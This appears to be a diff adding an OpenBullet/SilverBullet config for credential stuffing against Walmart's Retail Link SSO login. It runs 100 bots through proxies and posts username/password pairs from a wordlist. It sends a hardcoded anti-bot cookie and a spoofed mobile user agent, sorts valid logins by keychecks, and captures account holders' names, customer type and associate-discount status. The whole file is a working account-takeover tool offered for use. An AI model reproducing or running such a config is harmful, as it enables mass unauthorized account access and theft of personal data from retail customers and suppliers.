@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "Walmart",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2024-02-25T12:57:32.1117647+01:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Walmart",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": "",
+  "Message": "",
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#ClearCookies FUNCTION ClearCookies 
+
+#POST REQUEST POST "https://retaillink.login.wal-mart.com/api/ssologin" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"language\":\"en\",\"oauthParams\":{\"clientId\":\"2c471dd6-feea-41ae-8a8f-8137481f9128\",\"clientType\":\"supplier\",\"redirectUri\":\"https://www.wmtflip.com/api/mobileauth/callback\",\"scope\":\"openid profile_deepfetch\",\"responseType\":\"code\",\"state\":\"GA0EISIO0J\",\"nonce\":\"0DZ7JM5FSB\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: retaillink.login.wal-mart.com" 
+  HEADER "Cookie: _px3=01c740c4b57feece9901d7267cb2f10716907e52bce1348c22e0f7d76677775b:saZGMIUKG1UoV0kjhLrcJ5XzXNr8TTjtobL734jDoqiJorO7FtUNixA7vVgoSLt0XMFDUAPWFcfno/k98k7+Tw==:1000:vm3WNDGbOzbwh6+r62LKvouHSDUgmMhIYdgN4UM4Ut0NTRDZDANJThWZcvTHDmoCacZFnGlV5IIio0+JEEyDig7mPjZX7uthPme8TzDbSSdZbcCkR5eeWI/at06K/+4BR9OSqPyX61PADC7Qq3bbatt9I0tUgskovbXEVsIUB6UeGAI86jFQbchN1Vi7gdZ9sr+88tu25MU+Cd1YhtpJ9Q==; _ga=GA1.1.908904129.1691063021; _ga_1ND2QQ45PE=GS1.1.1691063021.1.0.1691063021.0.0.0; _pxvid=fe1b4b4b-31f2-11ee-90ca-6cd4f61244ff; pxcts=fe1b5dfb-31f2-11ee-90ca-787249566766; _pxff_tm=1; TS01b1e5a6=01c3c8a849f9829fe3ce9d38c5bf5b2f0af94266a68cff251945576a1c87099a1c58173716953f58061b79530ea4e3d020f3aed851; _gat_gtag_UA_129309181_1=1; _gid=GA1.2.932383386.1691063021; TS0111a950=01c3c8a849f9829fe3ce9d38c5bf5b2f0af94266a68cff251945576a1c87099a1c58173716953f58061b79530ea4e3d020f3aed851; TS04fe286f027=08a6069d6cab2000817b9aceed1f2fe6ff5caa2ff64a18e9f91299cf9caf272d577941e4c2c9363b08eb285a95113000034d0cdef1a902315e6ec622e72b7ef0893ba36b98bc50104c45ffcfe25e5f6c5529603a40ee907c796857137ddc86fb" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Accept-Language: en-GB,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Origin: https://retaillink.login.wal-mart.com" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1" 
+  HEADER "Referer: https://retaillink.login.wal-mart.com/authorize?clientId=2c471dd6-feea-41ae-8a8f-8137481f9128&redirectUri=https://www.wmtflip.com/api/mobileauth/callback&nonce=0DZ7JM5FSB&clientType=supplier&state=GA0EISIO0J&responseType=code&scope=openid%20profile_deepfetch" 
+  HEADER "Content-Length: 341" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "sso.login.usernameError" 
+    KEY "\"success\":false" 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true" 
+    KEY "verificationToken" 
+
+#firstName PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "firstName" 
+
+#lastName PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "lastName" 
+
+#customerType PARSE "<SOURCE>" JSON "customerType" CreateEmpty=FALSE -> CAP "customerType" 
+
+#hasAssociateDiscountCard PARSE "<SOURCE>" JSON "hasAssociateDiscountCard" CreateEmpty=FALSE -> CAP "hasAssociateDiscountCard" 
+
+#isAssociated PARSE "<SOURCE>" JSON "isAssociate" CreateEmpty=FALSE -> CAP "isAssociated" 
